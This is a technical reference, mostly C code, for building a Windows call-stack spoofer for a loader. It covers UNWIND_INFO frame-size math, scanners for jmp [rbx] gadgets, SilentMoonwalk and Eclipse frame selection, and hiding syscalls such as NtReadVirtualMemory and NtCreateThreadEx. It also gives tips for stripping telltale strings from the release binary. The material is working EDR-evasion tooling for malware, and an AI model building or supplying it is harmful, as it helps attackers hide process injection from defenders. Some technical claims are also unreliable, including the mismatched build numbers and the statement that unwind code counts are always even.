# Frame Math — UNWIND_INFO, Gadget Scanners, SAVE_NONVOL Safety

This reference contains the exact algorithms and thresholds you need to implement a correct stack spoofer. Read sections on demand.

## Table of Contents

1. `.pdata` binary search
2. `calc_frame_size` — walking UNWIND_INFO including chained flags
3. SAVE_NONVOL safety filter (why gadgets crash when this is missing)
4. Gadget scanner with diagnostic instrumentation
5. Win11 22H2+ empirical inventory (kernelbase / user32 / wininet)
6. Diagnosing init failures
7. SET_FPREG and PUSH_NONVOL(RBP) frame scanners (SilentMoonwalk-specific)

---

## 1. `.pdata` binary search

`.pdata` lives at `IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXCEPTION]` (index 3). Entries are `RUNTIME_FUNCTION` (12 bytes each), sorted by `BeginAddress` RVA.

```c
typedef struct {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindInfoAddress; // low bit set = chain continuation, mask with ~1
} RUNTIME_FUNCTION;
```

Lookup:

```c
PRUNTIME_FUNCTION lookup(void *base, uintptr_t addr) {
    /* parse headers */
    DWORD rva  = (DWORD)(addr - (uintptr_t)base);
    DWORD pd_rva = nt->OptionalHeader.DataDirectory[3].VirtualAddress;
    DWORD pd_sz  = nt->OptionalHeader.DataDirectory[3].Size;
    PRUNTIME_FUNCTION table = (PRUNTIME_FUNCTION)((BYTE*)base + pd_rva);
    DWORD n = pd_sz / sizeof(RUNTIME_FUNCTION);
    DWORD lo = 0, hi = n;
    while (lo < hi) {
        DWORD m = (lo + hi) / 2;
        if      (rva <  table[m].BeginAddress) hi = m;
        else if (rva >= table[m].EndAddress)   lo = m + 1;
        else                                    return &table[m];
    }
    return NULL;
}
```

**Gotcha**: `EndAddress` is exclusive. `rva == EndAddress` means you are one byte past the function — `lookup` correctly returns no entry, do not off-by-one this.

**Chained flag**: if `unwind_info->Flags & UNW_FLAG_CHAININFO` is set, the `UnwindCodes[]` array is followed by a `RUNTIME_FUNCTION` of the parent (at the next 4-byte-aligned offset after the last code). Binary search must be unaware of chains — chain resolution happens during frame-size walk, not lookup.

---

## 2. `calc_frame_size` — complete algorithm

Walk `UNWIND_INFO.UnwindCodes[]` adding allocation sizes, handling multi-slot opcodes:

```c
size_t calc_frame_size(void *base, PRUNTIME_FUNCTION rf) {
    size_t total = 0;
    bool has_save = false;
    size_t max_save = 0;

    for (;;) {
        PUNWIND_INFO ui = (PUNWIND_INFO)((BYTE*)base + rf->UnwindInfoAddress);
        int n = ui->CountOfCodes;
        PUNWIND_CODE codes = ui->UnwindCode;

        for (int i = 0; i < n; /* advance inside */) {
            PUNWIND_CODE c = &codes[i];
            UCHAR op = c->UnwindOp;
            UCHAR info = c->OpInfo;
            switch (op) {
              case UWOP_ALLOC_LARGE:
                if (info == 0) { total += codes[i+1].FrameOffset * 8; i += 2; }
                else           { total += *(UINT32*)&codes[i+1]; i += 3; }
                break;
              case UWOP_ALLOC_SMALL: total += (size_t)info * 8 + 8; i += 1; break;
              case UWOP_PUSH_NONVOL: total += 8; i += 1; break;
              case UWOP_SET_FPREG:   i += 1; break;
              case UWOP_SAVE_NONVOL:
                has_save = true;
                { size_t off = codes[i+1].FrameOffset * 8;
                  if (off > max_save) max_save = off; }
                i += 2; break;
              case UWOP_SAVE_NONVOL_FAR:
                has_save = true;
                { size_t off = *(UINT32*)&codes[i+1];
                  if (off > max_save) max_save = off; }
                i += 3; break;
              case UWOP_SAVE_XMM128:     i += 2; break;
              case UWOP_SAVE_XMM128_FAR: i += 3; break;
              case UWOP_PUSH_MACHFRAME:  total += (info ? 48 : 40); i += 1; break;
              default: return 0; /* unknown opcode → reject */
            }
        }

        if (ui->Flags & UNW_FLAG_CHAININFO) {
            /* chained: last aligned codes[] slot holds parent RUNTIME_FUNCTION */
            int aligned = (n + 1) & ~1;  /* round up to even */
            rf = (PRUNTIME_FUNCTION)&codes[aligned];
            continue;
        }
        break;
    }

    /* SAFETY: see §3 */
    if (has_save && max_save >= total) return 0;
    return total + 8; /* +8 for return address slot */
}
```

**Common mistakes**:
- Forgetting to iterate in pairs (`CountOfCodes` is always even; `codes[]` is packed)
- Advancing `i += 1` on `UWOP_SAVE_NONVOL` (consumes 2 slots)
- Treating `OpInfo` as signed (it is 4 bits, always unsigned)
- Missing the `+8` for return address slot at the end (makes every `frame_size` 8 bytes short → JMP [RBX] placement wrong)

---

## 3. SAVE_NONVOL safety filter — why you need it

**Symptom when missing**: syscall dispatched fine, spoofed stack looks right, but the **5th syscall argument is corrupted**. Most commonly observed: `NtReadVirtualMemory` returns with `STATUS_PARTIAL_COPY` because `lpNumberOfBytesRead` (5th arg, passed at `[RSP+0x28]`) got overwritten by the gadget function's prologue register-save.

**Cause**: you planted a frame of size `total`, but the gadget's real prologue saves a nonvolatile register at `[RSP + max_save]`. If `max_save >= total`, the save writes beyond the frame you allocated, into the caller's shadow/arg region. That region contains the 5th+ syscall args.

**Filter**: reject any candidate where `has_save && max_save_offset >= total_alloc`. This is the single most important filter. Without it, you will chase nondeterministic `STATUS_PARTIAL_COPY` / `STATUS_ACCESS_VIOLATION` failures for weeks.

**Logging hint**: track rejections in debug builds. On Win11 22H2+ kernelbase, ~8 of 14 `FF 23` gadgets are rejected by this filter. Silent rejection makes the scanner look like it found zero gadgets.

```c
static atomic_uint64_t rejected_savenonvol = 0;
/* in calc_frame_size, before returning 0: */
if (has_save && max_save >= total) {
    atomic_fetch_add(&rejected_savenonvol, 1);
    return 0;
}
```

---

## 4. Gadget scanner with diagnostic instrumentation

The canonical `FF 23` scanner. Every debug-gated counter matters — silent failures here are the #1 time sink.

```c
int find_jmp_rbx(void *mod, size_t min_frame, int require_eclipse,
                 uintptr_t *out_addr, size_t *out_frame) {
    uint8_t *ts; size_t tsz;
    text_range(mod, &ts, &tsz);
    if (!ts || tsz < 7) return 0;

    uintptr_t best_addr = 0; size_t best_frame = 0;
#if DBG
    uint64_t n_ff23 = 0, n_eclipse_fail = 0, n_fs_zero = 0;
    uint64_t n_below = 0, n_ok = 0;
    size_t   any_best_fs = 0; uintptr_t any_best_addr = 0;
#endif
    for (size_t i = 5; i + 1 < tsz; i++) {
        if (ts[i] != 0xFF || ts[i+1] != 0x23) continue;
        uintptr_t g = (uintptr_t)(ts + i);
#if DBG
        n_ff23++;
#endif
        if (require_eclipse && *(uint8_t *)(g - 5) != 0xE8) {
#if DBG
            n_eclipse_fail++;
#endif
            continue;
        }
        size_t fs = calc_frame_size_at(mod, g);
#if DBG
        if (fs == 0)               n_fs_zero++;
        else if (fs < min_frame) { n_below++;
            if (fs > any_best_fs) { any_best_fs = fs; any_best_addr = g; }
        } else                     n_ok++;
#endif
        if (fs < min_frame)  continue;
        if (fs > best_frame) { best_frame = fs; best_addr = g; }
    }
#if DBG
    DBG_KV("FF23_total",       n_ff23);
    DBG_KV("fs_zero",          n_fs_zero);
    DBG_KV("eclipse_fail",     n_eclipse_fail);
    DBG_KV("below_min",        n_below);
    DBG_KV("ok",               n_ok);
    DBG_KV("best_belowmin_fs", any_best_fs);
    DBG_KV("best_belowmin_addr", any_best_addr);
    DBG_KV("min_frame",        min_frame);
#endif
    if (!best_addr) return 0;
    *out_addr  = best_addr;
    *out_frame = best_frame;
    return 1;
}
```

**Release build**: `#if DBG` blocks compile to nothing, including the string literals `"FF23_total"` etc. Verify via `strings -a loader.exe | grep FF23` — must be empty. If it is not, either `DBG_KV` is a real function call (change to a macro that expands to `((void)0)` in release) or the compiler is not eliminating unused string literals (add `-ffunction-sections -fdata-sections -Wl,--gc-sections`).

---

## 5. Win11 22H2+ empirical inventory

Measured on Windows 11 Build 22631.3880 (24H2 equivalent), `kernelbase.dll` 10.0.22621.3880, retail un-patched build.

| Module | `.text` size | Total `FF 23` | Max frame (pass SAVE_NONVOL) | Max frame (all) | Eclipse candidates |
|---|---|---|---|---|---|
| kernelbase.dll | 1.4 MB | 14 | `0x70` | `0xB8` | 0 |
| ntdll.dll | 1.2 MB | 6 | `0x40` | `0x40` | 0 |
| kernel32.dll | 900 KB | 2 | 0 | `0x28` | 0 |
| user32.dll | 1.1 MB | 12 | `0x58` | `0xA0` | 4 |
| wininet.dll | 1.8 MB | 34 | `0x98` | `0xF0` | 18 |

**Takeaways**:
- kernelbase-only strategy fails for any syscall with > 11 args
- user32 provides the best Eclipse pool on this build
- wininet requires `LoadLibraryW` (not loaded by default in console EXEs); preload it in `spoof_init` if you need Eclipse
- ntdll is useless as a gadget source (only 6 gadgets, all frame `0x40`)

These numbers shift per build. Treat them as order-of-magnitude; re-measure on your actual target image.

---

## 6. Diagnosing init failures

Given the debug output from §4, the decision tree:

```
FF23_total == 0
  → module has been stripped. Add another module to cascade.

FF23_total > 0 && ok == 0 && fs_zero > FF23_total/2
  → SAVE_NONVOL filter rejecting most candidates.
  → Verify: run same scanner with filter disabled, record max_save_offset for each.
    If max_save_offset always equals total_alloc exactly (not >=), you have an
    off-by-one in the filter; change `>=` to `>`.

FF23_total > 0 && ok == 0 && best_belowmin_fs > 0
  → Threshold too aggressive. Recompute min_frame for your syscall's arg count.
  → For NtCreateThreadEx: min_frame = 0x60; if best_belowmin_fs = 0x70,
    lowering threshold to 0x60 gives you the 0x70 gadget. 

require_eclipse == 1 && eclipse_fail == FF23_total
  → No CALL-preceded gadgets in this module on this build.
  → Expected for kernelbase on Win11 22H2+.
  → Cascade order: try wininet first (has 18), user32 (has 4), then drop eclipse.

Init succeeds, syscall crashes
  → buf too small. Recompute: 8 + frame2 + frame1 + trampoline + args*8 + 0x100.
  → Or: RBX not pointing at the fixup slot. Verify RBX = (top of buffer) - 8.
  → Or: LLVM ate RBX; add to clobber list.

Init succeeds, unwinder reports broken chain
  → frame_size mismatch. You fetched .pdata for the function entry but planted
    frame for the retaddr. Re-run calc_frame_size for the retaddr, not the
    function head. Chained UNWIND_INFO (`UNW_FLAG_CHAININFO`) may apply.
```

---

## 7. SET_FPREG and PUSH_NONVOL(RBP) frame scanners (SilentMoonwalk)

SM DESYNC requires two additional frame types:

- **FirstFrame** — function whose UNWIND_INFO contains `UWOP_SET_FPREG` (and no `UWOP_SAVE_XMM128`). This terminates the unwinder walk.
- **SecondFrame** — function with `UWOP_PUSH_NONVOL(rbp)` (opcode 0, info = rbp register encoding 5) and **no** `UWOP_SET_FPREG` (if both, it is a FirstFrame, not a SecondFrame).

Both require a CALL instruction inside the function body so the planted retaddr points after a real call — Eclipse-consistent even for the SM-specific frames.

Scanner pseudocode:

```c
FrameResult *find_set_fpreg(void *mod, size_t min_frame) {
    /* iterate .pdata entries */
    for each entry:
        unwind = unwind_info_at(mod, entry->UnwindInfoAddress);
        has_fpreg = false; has_xmm = false;
        /* walk codes[] as in §2 */
        if (!has_fpreg || has_xmm) continue;
        fs = calc_frame_size(mod, entry);
        if (fs < min_frame) continue;
        call_off = find_call_in_function(mod, entry);  /* scan for E8 */
        push candidate{func_addr, fs, call_off};
    /* pick best: callOffset != 0 preferred, then largest frame */
}
```

**PUSH_NONVOL(rbp) detection**: `UnwindOp == UWOP_PUSH_NONVOL (0)` && `OpInfo == 5` (rbp). Single-slot opcode.

**RBP plant offset**: the stack offset where rbp is saved, derived from the *position* of the PUSH_NONVOL opcode in the prologue relative to UWOP_ALLOC_* sizes. Not the `OpInfo` — that is the register number. Walking the unwind code list forward and summing stack adjustments gives you `rbp_plant_offset`:

```c
size_t running_alloc = 0;
for code in codes:
    if code is PUSH_NONVOL: running_alloc += 8;
    if code is PUSH_NONVOL(rbp): rbp_plant_offset = running_alloc - 8; break;
    if code is ALLOC_SMALL:     running_alloc += OpInfo * 8 + 8;
    if code is ALLOC_LARGE:     running_alloc += (imm as above);
```

This is the offset at which SM plants a fake RBP value pointing into the FirstFrame — required for the unwinder to chain FirstFrame → SecondFrame correctly.
